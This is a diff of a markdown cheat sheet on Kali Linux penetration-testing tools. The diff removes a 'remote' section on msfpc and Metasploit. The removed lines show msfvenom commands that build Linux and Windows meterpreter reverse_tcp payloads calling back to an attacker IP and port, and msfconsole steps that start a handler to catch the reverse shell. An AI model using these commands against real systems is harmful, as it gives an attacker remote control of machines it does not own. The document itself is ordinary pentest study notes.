@@ -247,42 +247,8 @@ kali:~ # apt install zaproxy
 
 ## remote
 
-### [msfpc](https://github.com/g0tmi1k/msfpc)
 
-```bash
-kali:~ # msfpc -h
-```
-
-
-### metasploit framework
-
-```
-kali     target machine
-   |          |
-   |          |
-   +----------+...
-```
-
-```bash
-kali:~ # msfvenom -h
-kali:~ # msfvenom -l payloads|format|archs
-kali:~ # msfvenom -p <payload> LHOST=<kali ip> LPORT=<kali port> -f <format> -o <file>
-# LHOST: local host, LPORT: local port
-# example
-kali:~ # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o hacker    # for linux
-kali:~ # msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f exe -o hacker.exe  # for windows
-```
-
-```bash
-kali:~ # msfconsole
-msf6 > help
-msf6 > help use
-msf6 > use exploit/multi/handler
-msf6 > show options
-msf6 > set LHOST <kali ip>
-msf6 > set LPORT <kali port>
-msf6 > exploit
-```
+### [metasploit framework](https://www.metasploit.com/)
 
 
 ---
